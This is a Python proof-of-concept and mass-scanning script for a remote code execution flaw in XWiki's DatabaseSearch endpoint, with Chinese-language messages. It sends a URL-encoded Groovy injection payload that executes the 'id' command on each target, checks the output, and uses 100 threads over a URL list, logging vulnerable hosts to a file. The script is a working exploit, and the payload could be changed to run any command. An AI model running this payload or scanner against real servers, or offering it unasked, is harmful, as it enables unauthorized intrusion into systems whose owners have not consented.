import argparse,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
                                                                           ______
    ______________________________________________ ___  /
    ___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
    __  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
    _  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
    /_/                                              
                                          author:lly
                                          date:2024-09-12
                                          version:1.0                    
    """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="XWiki DatabaseSearch 远程代码执行漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    # print(args.url)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")

def poc(target):
    url_payload = "/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7Dthrow%20new%20Exception%28%27id%27.execute%28%29.text%29%3B%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20"
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", 
        "Accept": "application/json, text/javascript, */*; q=0.01", 
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", 
        "Accept-Encoding": "gzip, deflate", "Connection": "close"
        }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    
    try:
        response = requests.get(url=url,headers=headers,proxies=proxies,timeout=5)
        if response.status_code == 200 and 'uid' in response.text and 'groups' in response.text:
            print(f"[+] {target} 存在RCE漏洞！")
            with open('result.txt','a')as f:
                f.write(target+'\n')
        else:
            print("[-]漏洞不存在")
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")
            

if __name__ == '__main__':
    main()